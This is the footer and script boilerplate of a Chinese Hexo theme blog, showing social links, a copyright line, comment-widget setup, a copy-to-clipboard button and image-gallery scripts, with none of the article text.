        <div class="social-wrapper">
          
            
              <a href="/atom.xml"
                class="social fas fa-rss flat-btn"
                target="_blank"
                rel="external nofollow noopener noreferrer">
              </a>
            
          
            
              <a href="mailto:895531613@qq.com"
                class="social fas fa-envelope flat-btn"
                target="_blank"
                rel="external nofollow noopener noreferrer">
              </a>
            
          
            
              <a href="https://github.com/baiyecha404"
                class="social fab fa-github flat-btn"
                target="_blank"
                rel="external nofollow noopener noreferrer">
              </a>
            
          
        </div>
      
    
      
        <div class='copyright'>
        <p><a href="bycsec.top">Copyright © 2020 byc_404</a></p>

        </div>
      
    
      
        <a href="https://bycsec.top/" target="_blank" class="codename">IGNITE</a>
        , total visits
          <span id="busuanzi_value_site_pv"><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
          times
        
      
    
  </footer>

<script>setLoadingBarProgress(80);</script>


      <script>setLoadingBarProgress(60);</script>
    </div>
    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
  </div>
  
<script src="https://cdn.jsdelivr.net/npm/jquery@3.4/dist/jquery.min.js"></script>


  <script>
    
    var SEARCH_SERVICE = "hexo" || "hexo";
    var ROOT = "/" || "/";
    if (!ROOT.endsWith('/')) ROOT += '/';
  </script>


  <script async src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2/js/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>


  <script src="https://cdn.jsdelivr.net/npm/scrollreveal@4.0.6/dist/scrollreveal.min.js"></script>
  <script type="text/javascript">
    $(function() {
      ScrollReveal().reveal('.l_main .reveal', {
        distance: '8px',
        duration: '800',
        interval: '100',
        scale: '1'
      });
    });
  </script>


  
<script src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js"></script>

  <script type="text/javascript">
    $(function() {
      Waves.attach('.flat-btn', ['waves-button']);
      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
      Waves.attach('.flat-box', ['waves-block']);
      Waves.attach('.float-box', ['waves-block', 'waves-float']);
      Waves.attach('.waves-image');
      Waves.init();
    });
  </script>


  <script async src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-busuanzi@2.3/js/busuanzi.pure.mini.js"></script>



  
  
  
    
<script src="https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js"></script>

    <script type="text/javascript">
      $(function(){
        var imgs=["https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/BBC19066-E176-47C2-9D22-48C81EE5DF6B.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/B18FCBB3-67FD-48CC-B4F3-457BA145F17A.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/00E0F0ED-9F1C-407A-9AA6-545649D919F4.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/67239FBB-E15D-4F4F-8EE8-0F1C9F3C4E7C.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/B951AE18-D431-417F-B3FE-A382403FF21B.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/2884F904-F1F3-479E-AE27-5EBC291B63B0.jpeg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/landscape/250662D4-5A21-4AAA-BB63-CD25CF97CFF1.jpeg"];
        if ('true' == 'true') {
          function shuffle(arr){
            /*From countercurrent-time*/
            var n = arr.length;
            while(n--) {
              var index = Math.floor(Math.random() * n);
              var temp = arr[index];
              arr[index] = arr[n];
              arr[n] = temp;
            }
          }
          shuffle(imgs);
        }
        if ('') {
          $('').backstretch(
            imgs,
          {
            duration: "20000",
            fade: "1500"
          });
        } else {
          $.backstretch(
            imgs,
          {
            duration: "20000",
            fade: "1500"
          });
        }
      });
    </script>
  











  
    
<script src="https://cdn.jsdelivr.net/npm/valine@1.4/dist/Valine.min.js"></script>

  
  <script>
  var GUEST_INFO = ['nick','mail','link'];
  var meta = 'nick,mail,link'.split(',').filter(function(item){
    return GUEST_INFO.indexOf(item) > -1
  });
  var REQUIRED_FIELDS = ['nick','mail','link'];
  var requiredFields = 'nick,mail'.split(',').filter(function(item){
    return REQUIRED_FIELDS.indexOf(item) > -1
  });
  var valine = new Valine();
  function emoji(path, idx, ext) {
      return path + "/" + path + "-" + idx + "." + ext;
  }
  var emojiMaps = {};
  for (var i = 1; i <= 54; i++) {
    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
  }
  for (var i = 1; i <= 101; i++) {
    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
  }
  for (var i = 1; i <= 116; i++) {
    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
  }
  for (var i = 1; i <= 125; i++) {
    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
  }
  for (var i = 1; i <= 4; i++) {
    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
  }
  valine.init({
    el: '#valine_container',
    meta: meta,
    
    appId: "pHdKUGJwAoGnVczqB6eSKVzO-gzGzoHsz",
    appKey: "9HlyBGu0qm9EmkSNKD2qoBx4",
    placeholder: "快来评论吧~",
    pageSize:'10',
    avatar:'robohash',
    lang:'zh-cn',
    visitor: 'true',
    highlight: 'true',
    mathJax: 'false',
    enableQQ: 'true',
    requiredFields: requiredFields,
    emojiCDN: 'https://cdn.jsdelivr.net/gh/xaoxuu/cdn-assets/emoji/valine/',
    emojiMaps: emojiMaps
  })
  </script>





  
<script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2.6.5/js/app.js"></script>



  
<script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2.6.5/js/search.js"></script>



  
<script src="https://cdn.jsdelivr.net/gh/xaoxuu/cdn-volantis@2/js/comment_typing.js"></script>






<!-- 复制 -->

  <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('fa-copy');
        $icon.addClass('fa-check-circle');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('fa-check-circle');
          $icon.addClass('fa-copy');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('fa-copy');
        $icon.addClass('fa-times-circle');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('fa-times-circle');
          $icon.addClass('fa-copy');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>




<!-- fancybox -->

  <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
<script>
  let LAZY_LOAD_IMAGE = "";
  $(".article-entry").find("div.fancybox").find("img").each(function () {
      var element = document.createElement("a");
      $(element).attr("data-fancybox", "gallery");
      $(element).attr("href", $(this).attr("src"));
      /* 图片采用懒加载处理时,
       * 一般图片标签内会有个属性名来存放图片的真实地址，比如 data-original,
       * 那么此处将原本的属性名src替换为对应属性名data-original,
       * 修改如下
       */
       if (LAZY_LOAD_IMAGE) {
         $(element).attr("href", $(this).attr("data-original"));
       }
      $(this).wrap(element);
  });
</script>






  <script>setLoadingBarProgress(100);</script>
</body>
</html>
